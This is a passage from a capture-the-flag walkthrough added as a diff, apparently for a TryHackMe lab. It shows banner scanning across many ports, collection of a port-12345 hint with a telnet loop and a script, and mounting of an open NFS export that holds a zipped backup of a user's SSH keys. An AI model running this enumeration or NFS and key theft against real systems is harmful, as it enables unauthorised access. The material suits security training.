@@ -255,3 +255,260 @@ Server: HttpServer
 �00$000brkl0000000000000000000000000
 (UNKNOWN) [10.10.173.229] 62 (?) open
 HTTP/1.0 200 OK
+Cache-Control: no-cache
+Expires: -1
+Content-Type: text/html
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+  <title>Thomson Gateway - Startseite</title>
+(UNKNOWN) [10.10.173.229] 61 (?) open
+Annuaire �lectronique
+(UNKNOWN) [10.10.173.229] 60 (?) open
+HTTP/1.1 845 x
+Connection: Keep-Alive
+Server: Siemens Gigaset C450 IP
+
+(UNKNOWN) [10.10.173.229] 59 (?) open
+HTTP/1.0 524 o
+Server: Roxen/2WCqTRDKAU
+
+(UNKNOWN) [10.10.173.229] 58 (?) open
+220-t
+?:220-|    WarFTPd 0SAadKgt (thKi) Ready
+
+(UNKNOWN) [10.10.173.229] 57 (?) open
+HTTP/1.0 613 t
+Server: Apple Embedded Web Server/438676
+
+(UNKNOWN) [10.10.173.229] 56 (?) open
+��"��
+                  Areca Technology Corporation RAID Controller             
+(UNKNOWN) [10.10.173.229] 55 (?) open
+?SH-6529890-OpenSSH_lTp FreeBSD-openssh-portable-?:oyxBr
+
+(UNKNOWN) [10.10.173.229] 54 (?) open
+����
+
+Copyright (c) 2004 - 2006 3Com Corporation. All rights reserved.
+
+0Username: 
+0Password: 
+0
+
+Copyright (c) 2004 - 2006 3Com Corporation. All rights reserved.
+
+0Username: 
+(UNKNOWN) [10.10.173.229] 53 (domain) open
+match ftp m%^220-loading..
+220-|           W e L c O m E @ SFXP|=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|
+% p/SwiftFXP/
+(UNKNOWN) [10.10.173.229] 52 (?) open
+������!����
+Sportster Pro 304 Image Sagem D-BOX2 - Kernel Almwhh 
+(UNKNOWN) [10.10.173.229] 51 (?) open
+HTTP/1.0 500 Internal Error
+Connection: close
+Cache-Control: no-cache, no-store
+
+<html><body><h1>Internal Server Error</h1>Failure(&quot;No handler table for HTTP method Unknown OPTIONS&quot;)</body></html>
+(UNKNOWN) [10.10.173.229] 50 (?) open
+550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 49 (tacacs) open
+550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 48 (?) open
+550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 47 (?) open
+550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00(UNKNOWN) [10.10.173.229] 46 (?) open
+550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00(UNKNOWN) [10.10.173.229] 45 (?) open
+550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00(UNKNOWN) [10.10.173.229] 44 (?) open
+550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00(UNKNOWN) [10.10.173.229] 43 (whois) open
+550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00(UNKNOWN) [10.10.173.229] 42 (?) open
+550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00(UNKNOWN) [10.10.173.229] 41 (?) open
+550 12345 0fffffffffffffffffff700008888800000000088000080007fff00(UNKNOWN) [10.10.173.229] 40 (?) open
+550 12345 0fffffffffffffffff70008878800000000000008878008007fff00(UNKNOWN) [10.10.173.229] 39 (?) open
+550 12345 0fffffffffffffff800888880000000000000000000800800cfff00(UNKNOWN) [10.10.173.229] 38 (?) open
+550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00(UNKNOWN) [10.10.173.229] 37 (time) open
+550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00(UNKNOWN) [10.10.173.229] 36 (?) open
+550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00(UNKNOWN) [10.10.173.229] 35 (?) open
+550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00(UNKNOWN) [10.10.173.229] 34 (?) open
+550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00(UNKNOWN) [10.10.173.229] 33 (?) open
+550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00(UNKNOWN) [10.10.173.229] 32 (?) open
+550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00(UNKNOWN) [10.10.173.229] 31 (?) open
+550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00(UNKNOWN) [10.10.173.229] 30 (?) open
+550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00(UNKNOWN) [10.10.173.229] 29 (?) open
+550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00(UNKNOWN) [10.10.173.229] 28 (?) open
+550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00(UNKNOWN) [10.10.173.229] 27 (?) open
+550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00(UNKNOWN) [10.10.173.229] 26 (?) open
+550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00(UNKNOWN) [10.10.173.229] 25 (smtp) open
+550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00(UNKNOWN) [10.10.173.229] 24 (?) open
+550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00(UNKNOWN) [10.10.173.229] 23 (telnet) open
+550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00(UNKNOWN) [10.10.173.229] 22 (ssh) open
+550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00(UNKNOWN) [10.10.173.229] 21 (ftp) open
+550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00(UNKNOWN) [10.10.173.229] 20 (ftp-data) open
+550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00(UNKNOWN) [10.10.173.229] 19 (chargen) open
+550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00(UNKNOWN) [10.10.173.229] 18 (?) open
+550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00(UNKNOWN) [10.10.173.229] 17 (qotd) open
+550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00(UNKNOWN) [10.10.173.229] 16 (?) open
+550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00(UNKNOWN) [10.10.173.229] 15 (netstat) open
+550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00(UNKNOWN) [10.10.173.229] 14 (?) open
+550 12345 0fffffff8000000000008888000000000080000000000007fffff00(UNKNOWN) [10.10.173.229] 13 (daytime) open
+550 12345 0ffffffff000000888000000000800000080000008800007fffff00(UNKNOWN) [10.10.173.229] 12 (?) open
+550 12345 0ffffffff80008808880000000880000008880088800008ffffff00(UNKNOWN) [10.10.173.229] 11 (systat) open
+550 12345 0fffffffff000088808880000000000000088800000008fffffff00(UNKNOWN) [10.10.173.229] 10 (?) open
+550 12345 0fffffffff70000088800888800088888800008800007ffffffff00(UNKNOWN) [10.10.173.229] 9 (discard) open
+550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00(UNKNOWN) [10.10.173.229] 8 (?) open
+550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00(UNKNOWN) [10.10.173.229] 7 (echo) open
+550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00(UNKNOWN) [10.10.173.229] 6 (?) open
+550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00(UNKNOWN) [10.10.173.229] 5 (?) open
+550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 4 (?) open
+550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 3 (?) open
+550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 2 (?) open
+550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 1 (tcpmux) open
+550 12345 0000000000000000000000000000000000000000000000000000000 
+
+go to port 12345
+
+or
+
+┌──(witty㉿kali)-[~]
+└─$ for i in {1..100}; do (sleep 1; echo "get /") | telnet 10.10.173.229 $i | grep 550 >> x ; done
+
+┌──(witty㉿kali)-[~]
+└─$ tail x               
+550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
+550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
+550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
+550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
+550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
+550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
+550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+
+or using python
+
+┌──(witty㉿kali)-[~]
+└─$ python3 port_knocking.py   
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
+550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
+550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00
+550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00
+550 12345 0fffffffff70000088800888800088888800008800007ffffffff00
+550 12345 0fffffffff000088808880000000000000088800000008fffffff00
+550 12345 0ffffffff80008808880000000880000008880088800008ffffff00
+550 12345 0ffffffff000000888000000000800000080000008800007fffff00
+550 12345 0fffffff8000000000008888000000000080000000000007fffff00
+550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
+550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
+550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
+550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
+550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
+550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
+550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
+550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
+550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
+550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00
+550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
+550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00
+550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00
+550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00
+550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00
+550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00
+550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00
+550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00
+550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00
+550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00
+550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00
+550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00
+550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00
+550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00
+550 12345 0fffffffffffffff800888880000000000000000000800800cfff00
+550 12345 0fffffffffffffffff70008878800000000000008878008007fff00
+550 12345 0fffffffffffffffffff700008888800000000088000080007fff00
+550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00
+550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00
+550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00
+550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00
+550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00
+550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+HTTP/1.0 500 Internal Error
+
+┌──(witty㉿kali)-[~]
+└─$ nc 10.10.173.229 12345 -v        
+10.10.173.229: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.10.173.229] 12345 (?) open
+NFS shares are cool, especially when they are misconfigured
+It's on the standard port, no need for another scan  
+
+┌──(witty㉿kali)-[~]
+└─$ showmount -e 10.10.173.229
+Export list for 10.10.173.229:
+/home/nfs *
+                                                                                  
+┌──(witty㉿kali)-[~]
+└─$ cd Downloads
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo mkdir /mnt/hell-nfs       
+[sudo] password for witty: 
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo mount 10.10.173.229:/home/nfs /mnt/hell-nfs       
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd /mnt                 
+                                                                                  
+┌──(witty㉿kali)-[/mnt]
+└─$ ls
+hell-nfs  willow-failsafe
+                                                                                  
+┌──(witty㉿kali)-[/mnt]
+└─$ cd hell-nfs    
+                                                                                  
+┌──(witty㉿kali)-[/mnt/hell-nfs]
+└─$ ls
+backup.zip
+                                                                                  
+┌──(witty㉿kali)-[/mnt/hell-nfs]
+└─$ unzip backup.zip             
+Archive:  backup.zip
+checkdir error:  cannot create home
+                 Read-only file system
+                 unable to process home/hades/.ssh/.
+[backup.zip] home/hades/.ssh/id_rsa password: 
+   skipping: home/hades/.ssh/id_rsa  incorrect password
+   skipping: home/hades/.ssh/hint.txt  incorrect password
+   skipping: home/hades/.ssh/authorized_keys  incorrect password
+   skipping: home/hades/.ssh/flag.txt  incorrect password
+   skipping: home/hades/.ssh/id_rsa.pub  incorrect password
+
+┌──(root㉿kali)-[/mnt/hell-nfs]
+└─# file backup.zip      
+backup.zip: Zip archive data, at least v1.0 to extract, compression method=store
+
+┌──(root㉿kali)-[/mnt/hell-nfs]
+└─# pwd  
+/mnt/hell-nfs
+                                                                                  
+┌──(root㉿kali)-[/mnt/hell-nfs]
+└─# cd /root                                                        
+                                                                                  
+┌──(root㉿kali)-[~]
+└─# ls     
+go  nuclei-templates  reults.txt  subdomains.txt  targets.txt
+                                                                                  
+┌──(root㉿kali)-[~]
+└─# mkdir hell_thm
+                                                                                  
+┌──(root㉿kali)-[~]
+└─# cd hell_thm 
+                                                                                  
+┌──(root㉿kali)-[~/hell_thm]
